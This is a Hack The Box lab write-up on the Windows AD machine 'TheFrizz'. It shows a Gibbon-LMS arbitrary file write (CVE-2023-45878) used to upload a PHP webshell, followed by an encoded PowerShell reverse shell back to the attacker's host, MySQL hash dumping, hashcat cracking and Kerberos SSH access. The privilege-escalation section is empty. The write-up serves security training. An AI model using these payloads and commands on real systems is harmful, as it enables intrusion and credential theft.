---
title: "TheFrizz"
date: 2026-02-10
categories: [HTB]
tags: [windows, active-directory]
toc: true

image:
  path: /assets/img/htb/thefrizz/thefrizzmain.png
  alt: "TheFrizz"
---

TheFrizz is a retired Windows Server 2022 AD box chaining a Gibbon-LMS arbitrary file write (CVE-2023-45878) into webshell RCE, credential discovery, Kerberos-based domain access, and GPO permission abuse to reach Domain Admin.

---

## Recon
### Nmap — Port Discovery
Begin with a full TCP sweep to identify all open ports on the target.  
`sudo nmap -p- -T4 10.129.17.166 -oN scans/all_ports.txt -Pn`
![](/assets/img/htb/thefrizz/thefrizz1.png)

Parse the results to store all open ports in a variable for follow-up scanning.  
`ports=$(awk '/\/tcp/ && /open/ { split($1,a,"/"); p = (p ? p "," a[1] : a[1]) } END{ print p }' scans/all_ports.txt)`
![](/assets/img/htb/thefrizz/thefrizz5.png)

---

### Nmap — Service Enumeration
Run a targeted service and script scan against only the discovered open ports.  
`sudo nmap -p $ports -sC -sV -Pn --min-rate 500 10.129.232.168 -oN scans/service_enum.txt`
![](/assets/img/htb/thefrizz/thefrizz2.png)

---

### DNS/Host Resolution
Add `frizz.htb` and `frizzdc.frizz.htb` to `/etc/hosts` to enable proper name resolution.  
`echo '10.129.18.74 thefrizz.htb' | sudo tee -a /etc/hosts`
![](assets/img/htb/thefrizz/thefrizz3.png)
`echo '10.129.232.168 frizzdc.frizz.htb' | sudo tee -a /etc/hosts`
![](assets/img/htb/thefrizz/thefrizz44.png)

---

## SMB 445, 139
Nmap shows message signing enabled and required. `nxc` confirms SMBv1 is disabled and NTLM authentication is not accepted. Quick null and guest checks both fail, indicating valid domain credentials are required before SMB enumeration is possible.
![](assets/img/htb/thefrizz/thefrizz99.png)

---

## Web Enumeration (Port 80)
### Initial Access to the Web App
Browsing to port 80 presents a public “Walkerville Elementary School” site. The Staff Login link redirects to a Gibbon-LMS instance hosted on the same server.
![](assets/img/htb/thefrizz/thefrizz6.png)
![](assets/img/htb/thefrizz/thefrizz7.png)

---

### Directory Brute Force
Ran gobuster against the Gibbon-LMS directory to identify hidden endpoints or misconfigurations.
No additional interesting directories or files were discovered. Enumeration shifts to application-level vulnerabilities.  
`gobuster dir -u http://frizzdc.frizz.htb/Gibbon-LMS -w /home/user/tools/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php`
![](assets/img/htb/thefrizz/thefrizz8.png)

---

## Initial Access (Web → RCE)
### CVE-2023-45878 — Gibbon-LMS Arbitrary File Write  
The Gibbon-LMS instance is vulnerable to CVE-2023-45878, allowing arbitrary file write via a base64 image upload endpoint.  
Create a minimal PHP webshell:  
`echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php`

The endpoint expects base64-encoded data, so the file is encoded:  
`b64=$(base64 -w0 shell.php)`
![](assets/img/htb/thefrizz/thefrizz12.png)

The vulnerable endpoint allows writing arbitrary content to disk.  
`curl -s -X POST "http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php" -d "img=image/png;asdf,${b64}" -d "path=shell.php" -d "gibbonPersonID=0000000001"`
![](assets/img/htb/thefrizz/thefrizz14.png)

### Parameter breakdown:
* `img=image/png;asdf,${b64}`
    The server splits on the comma and base64-decodes the right side, writing it to disk.
* `path=shell.php`
    Controls the output filename. No extension restriction allows `.php`.
* `gibbonPersonID=0000000001`
    Required application field influencing save location.
  Successful upload returns the filename:  `shell.php%`

### Verify remote code execution  
Access the shell directly:  `curl -s -G "http://frizzdc.frizz.htb/Gibbon-LMS/shell.php" --data-urlencode "cmd=whoami"`
![](assets/img/htb/thefrizz/thefrizz13.png)
This confirms remote command execution on the web server.



### Shell

Before triggering the reverse shell, a Netcat listener was started locally to catch the incoming connection:  
`nc -lvnp 4444`
A PowerShell reverse shell payload is delivered via the webshell:  
`curl -s -G "http://frizzdc.frizz.htb/Gibbon-LMS/shell.php" --data-urlencode "cmd=powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA0ADcAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"`
![](assets/img/htb/thefrizz/thefrizz16.png)

This results in an interactive shell as `w.webservice`
![](assets/img/htb/thefrizz/thefrizz17.png)

---

## Post-Exploitation
### Credential Discovery — config.php
Inspecting the web root reveals config.php, which contains MySQL credentials.
![](assets/img/htb/thefrizz/configexposure.png)
![](assets/img/htb/thefrizz/mysqlcreds.png)

### MySQL Enumeration
The MySQL binary is located in:  
`C:\xampp\mysql\bin`
Connect using the discovered credentials:  
`.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "show databases;"`
![](assets/img/htb/thefrizz/mysql0showdatabases.png)

The gibbon database is identified. List tables:  
`.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "show tables;" gibbon`
![](assets/img/htb/thefrizz/mysql1.png)
![](assets/img/htb/thefrizz/mysql2gibbonperson.png)

From the listed tables, gibbonperson appears to store user account information. Inspecting its columns confirms it contains credential-related fields, including password hashes and salts. Dump user data:  
`.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "USE gibbon; SELECT * FROM gibbonperson;" -E` This reveals password hashes and salts.
![](assets/img/htb/thefrizz/passwordhash.png)

### Hashcat
Using the [Hashcat example hashes reference](https://hashcat.net/wiki/doku.php?id=example_hashes), the format corresponds to mode 1420. Prepare hash file:  
`echo "067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489" > hash.txt`
![](assets/img/htb/thefrizz/hashcatref.png)
![](assets/img/htb/thefrizz/hashcatecho.png)
Run Hashcat:  
`hashcat -m 1420 hash.txt /home/user/tools/rockyou.txt`
![](assets/img/htb/thefrizz/hashcatcracked.png)

---

## Domain Access
### Credential Validation
With the cracked password for f.frizzle, first validate the credentials against SMB.  
`nxc smb frizzdc.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23'`
The authentication succeeds, confirming the credentials are valid domain credentials.
![](assets/img/htb/thefrizz/validatecreds.png)

### Kerberos Configuration
To use Kerberos authentication, the local system must be configured for the FRIZZ.HTB realm. The /etc/krb5.conf file is modified to define the domain controller as the Key Distribution Center (KDC).  
`sudo nano /etc/krb5.conf`
```shell
[libdefaults]
    default_realm = FRIZZ.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = true
    ticket_lifetime = 24h
    forwardable = true

[realms]
FRIZZ.HTB = {
    kdc = frizzdc.frizz.htb
    admin_server = frizzdc.frizz.htb
    default_domain = frizz.htb
}

[domain_realm]
.frizz.htb = FRIZZ.HTB
frizz.htb = FRIZZ.HTB

```
This ensures Kerberos requests are directed to the correct domain controller.
![](assets/img/htb/thefrizz/krb5.png)

### Kerberos Authentication
Since this is a domain controller and NTLM authentication is restricted, the next step is to obtain a Kerberos Ticket Granting Ticket (TGT). Kerberos is the native authentication mechanism in Active Directory and will allow authenticated access to domain services such as LDAP and SMB. An initial attempt to request a TGT results in:  
`Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`
![](assets/img/htb/thefrizz/clockskew.png)

Kerberos requires synchronized system time. The earlier Nmap scan indicated clock skew. Synchronize time with the domain controller:  
`sudo ntpdate frizzdc.frizz.htb`
![](assets/img/htb/thefrizz/ntpupdate.png)

Request a TGT:  
`impacket-getTGT frizz.htb/f.frizzle:Jenni_Luvs_Magic23 -dc-ip 10.129.232.168`
![](assets/img/htb/thefrizz/savingticket.png)

Export the ticket:  
`export KRB5CCNAME=f.frizzle.ccache`
![](assets/img/htb/thefrizz/export.png)

Verify with `klist`. Kerberos authentication is now established for f.frizzle.
![](assets/img/htb/thefrizz/klist.png)

### Kerberos SSH Access
With a valid TGT loaded, SSH access is attempted using Kerberos authentication.  
`ssh f.frizzle@frizz.htb -k`
![](assets/img/htb/thefrizz/sshk.png)
Resulting in a PowerShell session as `f.frizzle`.

## Domain Enumeration
After gaining interactive access as f.frizzle, enumerate group membership and domain privileges.


## Privilege Escalation


